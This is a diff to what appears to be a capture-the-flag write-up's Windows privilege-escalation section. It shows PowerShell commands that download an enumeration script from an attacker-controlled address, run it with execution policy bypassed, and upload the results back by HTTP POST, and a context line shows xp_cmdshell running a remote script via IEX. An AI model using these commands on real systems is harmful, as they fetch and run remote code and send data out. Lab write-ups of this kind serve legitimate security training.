@@ -162,3 +162,15 @@ xp_cmdshell powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10
 # ROOT
 
 Start by running JAWs
+
+```
+powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.14.55:8000/jaws-enum.ps1', 'C:\tmp\file.ps1')
+
+powershell.exe -ExecutionPolicy Bypass -File C:\tmp\file.ps1 -OutputFilename C:\tmp\JAWS-Enum.txt
+```
+
+And the result can be uploaded using:
+
+```
+powershell Invoke-WebRequest -Uri http://10.10.14.55:8000 -Method Post -Infile C:\tmp\JAWS-Enum.txt 
+```
